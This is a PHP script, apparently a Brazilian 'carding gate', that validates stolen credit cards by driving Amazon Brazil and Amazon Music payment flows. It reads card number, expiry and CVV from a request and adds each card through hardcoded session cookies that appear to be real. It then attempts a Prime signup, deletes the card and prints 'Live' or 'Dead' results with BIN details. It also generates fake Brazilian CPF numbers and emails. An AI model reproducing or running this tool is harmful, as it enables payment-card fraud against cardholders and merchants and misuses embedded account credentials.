<?php
error_reporting(0);
session_start();

if (file_exists("cookie.txt")) {
    unlink("cookie.txt");
}

if (!isset($_SESSION['usuario'])) {
    exit("Usuario nao Logado");
}



function trazer($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

/*/####################/*/
###### CODER: @Flintphp77 #######
/*/###################/*/

function multiexplode($string){
    $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function bin($cartao){
    $contents = file_get_contents("bins.csv");
    $pattern = preg_quote(substr($cartao, 0, 6), '/');
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(";", $encontrada);
    return "$pieces[1] - $pieces[2] - $pieces[3] - $pieces[4] - $pieces[5]";
}

function gerarCPF() {
    for ($i = 0; $i < 9; $i++) {
      $cpf[$i] = mt_rand(0, 9);
    }
  
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
      $soma += ($cpf[$i] * (10 - $i));
    }
    $resto = $soma % 11;
    $cpf[9] = ($resto < 2) ? 0 : (11 - $resto);
  
    $soma = 0;
    for ($i = 0; $i < 10; $i++) {
      $soma += ($cpf[$i] * (11 - $i));
    }
    $resto = $soma % 11;
    $cpf[10] = ($resto < 2) ? 0 : (11 - $resto);
  
    return implode('', $cpf);
}

function generate_email() {
    $domains = array("gmail.com", "hotmail.com", "yahoo.com", "outlook.com");
    $domain = $domains[array_rand($domains)];
    $timestamp = time(); // timestamp atual em segundos
    $random_num = mt_rand(1, 10000); // número aleatório entre 1 e 10000
    $email = "user_" . $timestamp . "_" . $random_num . "@$domain";
    return $email;
}

// $email = generate_email();
// $cpf = gerarCPF();


$lista = $_GET['lista'];
$cc = multiexplode($lista)[0];
$mes = multiexplode($lista)[1];
$ano = multiexplode($lista)[2];
$cvv = multiexplode($lista)[3];
if (strlen($ano) > 2){
    $ano = substr($ano,2,4);
}

$parte1 = substr($cc, 0, 4);
$parte2 = substr($cc, 4, 4);
$parte3 = substr($cc, 8, 4);
$parte4 = substr($cc, 12, 4);
$mes = intval($mes);

$info_bin = bin($lista);


$cookie = trim('session-id=136-6946705-2552160;ubid-acbbr=133-2016390-9991554;x-acbbr="wEZPaEc7GOxfXDQUlm74JjtEEcDubSw?@EuJYGTb9axbVXYfsqbKiMMNRfAiXb78";at-acbbr=Atza|IwEBIB8gzWy_1b6q1SRyk93xg7Wofh6RfbC5YIQiPBRcKtenzPu0OuckYax3ar_V_5l4dzmczzgzDc2E2MkqQWaWMvmOpvUnEoHG-wB1y4uk46Ush3AZnwtEga83otupP5Sr2uhXimGDOhx8pbABY_V7R6l-dpGDGJlCYOLOtJ71tntC3H5dZCZnPU2MsXQoNh14A5wJd9Lo1cKNR5kPiop4FPLf9u-wf7Z1tpAy5Gk63AZsYQ;sess-at-acbbr="WJug1U0CLDeZtJzI97CFKBLF+Nq4vUTRMV6qnS1f6so=";sst-acbbr=Sst1|PQFm_b5r66rArgXxS1HGyCdfCaOU9jUgwwxad45vrUt_iirHygDxH47nBG-QueDHT5B-GjkJdeppeWdxQ2Jhr8W2l6q6sqdgopZeyCx0pHDdiMkUbq4n-NaCOwkRk_GLIys6r9E6gEtMJWlv1IaQxa48iUB7oIleUJHZriCQK9I2K5BxTIOJ5sNSEI7gSgP_eqMLHsimmhuc3Kzpa_EMxAJDmJJrZRVXse0XNWXf26ujJ6pwuHWWPxvPRbPSAZBXYrwXm75EdABq8y7lHAwa4UhMt_IxDK9O761aAasBwr-wmhU;session-id-time=2082787201l;i18n-prefs=BRL;csm-hit=s-Y3CKCA1ER74YR5CCD7VG|1687669754991;session-token=FN/2pPDKLbpOD8G5Pwgj45ZMAYK0HgO8zXesHlOTacWP3thb4FOfcoJz+Mm8nfTo3M08+8Em8O9LDK7Q3misEsZy3tSkLdOhFaxIxaMg6z1nWu8fgyiZOB568eilkUCJ+cRieBnngjvyJqmkBZy7JraRJmz2ja6zQJKQYy23CHK39vMiPSF3MLgTJ2+wKBBX5ipbO3FpcpiTDxhXfmY6t8uER1EvF6WSxoqOj5tnp1b1vjmikDSSdyUvqvZS7BkYvOkDydMwhfg=');

$cookie_music = trim('session-id=141-0123833-5005330;ubid-main=135-4600106-6480955;lc-main=en_US;x-main="D3FEny3WaR680BnwJcCbQeMEYWwdRjuvvyjm?MGWNpzTOXtx0nCDfHP?A75@TW8X";at-main=Atza|IwEBILPZcbn2YD6460HgJFusVPEh7VNrNvKPM9sk_8HNTes5dwiXI6qoLdP1cPyOCQdJU7zneQjWLIuMaF_q28ltfV3nipE6tZGWv_0yqcQzpMY7xAjUoIgV8gvWe3GMpQLtr1PLENquRKnNQk-WCJpp5Mx_AGBoq7gEbafD9JwBho3JwQku50DJQjMtaANprJM7HgiTw5L0VHpFqcuKhaV98YL4qKPVIF4nN2L8NNYQhHD1QQ;sess-at-main="8BJZJbhy51Y1+bGeqtSaSITMSY6MO9R3ABBuquBynQM=";session-id-time=2082787201l;session-token=b2m9IfAC3K9tiecdCbVf+WlKGRINjSOQ+zuBTKAvINmC15SgJUY9efCdC47cWrhEoCcU9WPGUHWDBSG6IU7cJzq9tYYWMnE4dw04Xykuy5KrqpXl8euomlDv3oW5zfcnbzgljijkojKk1Ud/oxaR+lO5l39/jbcZVRMXl9M05SBDOC+8dNBeoQNGY9OQVMU1WP4FIjJuxLWNitGKpwqjtaxeRCmlUANk51bTW6jENXY=');



$url = "https://www.amazon.com.br/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "Host: www.amazon.com.br",
    "Cookie: $cookie",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);
$customerId = trazer($resp, '"customerID":"', '"');
$session_id = trazer($resp, '"sessionId":"', '"');
$token_delete = trazer($resp, '"serializedState":"', '"');


function delete()
{
    global $customerId, $cookie;
    $url = "https://www.amazon.com.br/cpe/yourpayments/wallet";

    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_ENCODING, "gzip");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $headers = array(
        "Host: www.amazon.com.br",
        "Cookie: $cookie",
        "content-type: application/x-www-form-urlencoded",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    );
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

    $data = "fallbackToMPOWidget=true";

    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

    //for debug only!
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

    $resp = curl_exec($curl);
    $tk_if = trazer($resp, 'name="ppw-widgetState" value="', '"');
    $card_if = trazer($resp, '&quot;iid&quot;:&quot;', '&');

    $url = "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget";

    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_ENCODING, "gzip");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $headers = array(
        "Host: www.amazon.com.br",
        "Cookie: $cookie",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "viewport-width: 1536",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
        "accept: application/json, text/javascript, */*; q=0.01",
    );
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

    $data = "ppw-widgetEvent%3AStartDeleteEvent%3A%7B%22iid%22%3A%22$card_if%22%2C%22renderPopover%22%3A%22true%22%7D=&ppw-jsEnabled=true&ppw-widgetState=$tk_if&ie=UTF-8";

    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

    //for debug only!
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

    $resp = curl_exec($curl);
    $tk2_if = trazer($resp, 'name=\"ppw-widgetState\" value=\"', '\"');

    $url = "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget";

    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_ENCODING, "gzip");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $headers = array(
        "Host: www.amazon.com.br",
        "Cookie: $cookie",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "viewport-width: 1536",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
        "accept: application/json, text/javascript, */*; q=0.01",
    );
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

    $data = "ppw-widgetEvent%3ADeleteInstrumentEvent=&ppw-jsEnabled=true&ppw-widgetState=$tk2_if&ie=UTF-8";

    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

    //for debug only!
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

    $resp = curl_exec($curl);
}

if (strpos($resp, 'Cartão de crédito terminando em')) {
    delete();
} elseif (strpos($resp, 'Cartão de débito terminando em')) {
    delete();
}


# GERAR TOKEN

$url = "https://music.amazon.com/unlimited/signup";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "Host: music.amazon.com",
    "Cookie: $cookie_music",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$gerar_token = curl_exec($curl);
$token = trazer($gerar_token, 'name="ppw-widgetState" value="', '"');

# ADICIONAR CARD

$url = "https://music.amazon.com/unlimited/signup?sif_profile=APX-Encrypt-All-NA";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "Host: music.amazon.com",
    "Cookie: $cookie_music",
    "content-type: application/x-www-form-urlencoded",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "ppw-widgetState=$token&ie=UTF-8&ppw-accountHolderName=Samuel+Silva&addCreditCardNumber=$parte1+$parte2+$parte3+$parte4&ppw-expirationDate_month=$mes&ppw-expirationDate_year=20$ano&ppw-widgetEvent%3AAddCreditCardEvent=";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$add_card = curl_exec($curl);
$token2 = trazer($add_card, 'name="ppw-widgetState" value="', '"');
$address = trazer($add_card, 'name="ppw-addressSelection" value="', '"');



# GERAR CARD ID

$url = "https://music.amazon.com/unlimited/signup";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "Host: music.amazon.com",
    "Cookie: $cookie_music",
    "content-type: application/x-www-form-urlencoded",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "ppw-widgetState=$token2&ie=UTF-8&ppw-pickAddressType=Inline&ppw-addressSelection=$address&ppw-widgetEvent%3ASelectAddressEvent=";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$gerar_cardID = curl_exec($curl);
$card_id = trazer($gerar_cardID, '"selectedInstrumentIds":["', '"');


$url = "https://www.amazon.com.br/gp/prime/pipeline/membersignup";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: www.amazon.com.br",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$post_verify = curl_exec($curl);
$token_verify = trazer($post_verify, 'name="ppw-widgetState" value="','"');
$offerToken = trazer($post_verify, 'name="offerToken" value="','"');



$url = "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: www.amazon.com.br",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded; charset=UTF-8",
   "accept: application/json, text/javascript, */*; q=0.01",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "ppw-jsEnabled=true&ppw-widgetState=$token_verify&ppw-widgetEvent=SavePaymentPreferenceEvent";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$post_verify2 = curl_exec($curl);
$card_id2 = trazer($post_verify2, '"preferencePaymentMethodIds":"[\"','\"');




$url = "https://www.amazon.com.br/hp/wlp/pipeline/actions";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_HEADER, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: www.amazon.com.br",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded",
   "accept: */*",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "offerToken=$offerToken&session-id=$session_id&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&wlpLocation=debugClientId_PrimeDefault&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&paymentMethodId=$card_id2&isHorizonteFlow=1&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&wait=1&inline=1&disableCSM=1";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$Fim = curl_exec($curl);
// if (strpos($Fim, 'acceptOffer')) {
//     sendMessage("<b>✅Alguem tirou live UP\nLIVE: $parte1-XXXX-XXXX-$parte4\n[$info_bin]\nGate Amazon BR🔥</b>");
// }


# Delete passo 1

$url = "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: www.amazon.com.br",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded; charset=UTF-8",
   "accept: application/json, text/javascript, */*; q=0.01",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "ppw-jsEnabled=true&ppw-widgetState=$token_delete&ppw-widgetEvent=StartEditEvent&ppw-iid=$card_id2&ppw-paymentMethodType=Card&ppw-isDefaultPaymentMethod=false";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$parte1 = curl_exec($curl);
$ps1 = trazer($parte1, 'name=\"ppw-widgetState\" value=\"','\"');


$url = "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: www.amazon.com.br",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded; charset=UTF-8",
   "accept: application/json, text/javascript, */*; q=0.01",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "ppw-widgetEvent%3AStartDeleteEvent%3A%7B%22iid%22%3A%22$card_id%22%2C%22paymentMethodCode%22%3A%22CC%22%7D=Remover+da+carteira&ppw-jsEnabled=true&ppw-widgetState=$ps1&ie=UTF-8&ppw-accountHolderName=Samuel+Silva&ppw-expirationDate_month=$mes&ppw-expirationDate_year=20$ano";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$parte2 = curl_exec($curl);
$ps2 = trazer($parte2, 'name=\"ppw-widgetState\" value=\"','\"');


$url = "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: www.amazon.com.br",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded; charset=UTF-8",
   "accept: application/json, text/javascript, */*; q=0.01",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "ppw-jsEnabled=true&ppw-widgetState=$ps2&ie=UTF-8&ppw-widgetEvent=DeleteInstrumentEvent";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$parte3 = curl_exec($curl);
if (!strpos($parte3, 'Sua forma de pagamento foi removida com sucesso.')) {
    delete();
}



if (strpos($Fim, 'acceptOffer')) {
    echo "<br><span class='text-success'>[#Live] ➜ </span>
    <span class='text-info'>$lista ➜ </span>
    <span class='text-warning'>$info_bin ➜ </span>
    <span class='text-success'>[Cartao verificado] ➜ </span>
    <span class='text-info'>Center-509</span><br>";
    update($live);
    curl_close($curl);
    exit();
 } elseif (strpos($Fim, 'InvalidInput')) {
    echo "<br><span class='text-warning'>[#Dead] ➜ </span>
    <span class='text-info'>$lista ➜ </span>
    <span class='text-warning'>$info_bin ➜ </span>
    <span class='text-danger'>[Cartao Invalido] ➜ </span>
    <span class='text-info'>Center-509</span><br>";
    curl_close($curl);
    exit();
 } elseif (strpos($Fim, 'HARDVET_VERIFICATION_FAILED')) {
    echo "<br><span class='text-warning'>[#Dead] ➜ </span>
    <span class='text-info'>$lista ➜ </span>
    <span class='text-warning'>$info_bin ➜ </span>
    <span class='text-danger'>[Cartao recusado] ➜ </span>
    <span class='text-info'>Center-509</span><br>";
    curl_close($curl);
    exit();
 } else {
    echo "<br><span class='text-warning'>[#Dead] ➜ </span>
    <span class='text-info'>$lista ➜ </span>
    <span class='text-warning'>$info_bin ➜ </span>
    <span class='text-danger'>[Erro inesperado] ➜ </span>
    <span class='text-info'>Center-509</span><br>";
    curl_close($curl);
    exit();
 }



